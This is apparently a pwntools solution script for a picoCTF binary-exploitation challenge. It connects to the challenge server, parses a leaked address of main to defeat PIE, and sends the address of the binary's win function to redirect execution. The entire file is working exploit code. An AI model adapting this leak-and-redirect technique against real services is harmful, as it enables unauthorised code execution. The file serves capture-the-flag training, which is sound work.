#!/usr/bin/env python3
from pwn import *
context.binary="./vuln"

e=ELF("./vuln")
#r=process(e.path)
r=remote("rescued-float.picoctf.net", 61414)

r.recvuntil("main:")
leak=r.recvline().strip()
leak=int(leak, 16)
e.address=leak-e.sym.main
success("PIE base : %s" % hex(e.address))

r.sendlineafter("0x12345:", hex(e.sym.win))

r.interactive()
